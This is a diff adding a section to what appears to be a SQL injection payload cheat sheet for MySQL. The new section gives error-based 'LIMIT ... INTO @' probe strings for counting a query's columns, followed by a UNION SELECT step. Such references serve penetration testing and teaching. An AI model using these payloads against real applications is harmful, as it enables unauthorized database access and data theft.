@@ -95,6 +95,16 @@ This method works if error showing is enabled
 1' UNION SELECT @,@,@--+    #No error means query uses 3 column
                             #-1' UNION SELECT 1,2,3--+	True
 ```
+#### using `LIMIT INTO` Error Based
+This method works if error showing is enabled.
+
+It is useful for finding the number of columns when the injection point is after a LIMIT clause.
+```sql
+1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
+1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
+1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column
+                              #-1' UNION SELECT 1,2,3--+	True
+```
 ### Extract database with information_schema
 
 Then the following codes will extract the databases'name, tables'name, columns'name.
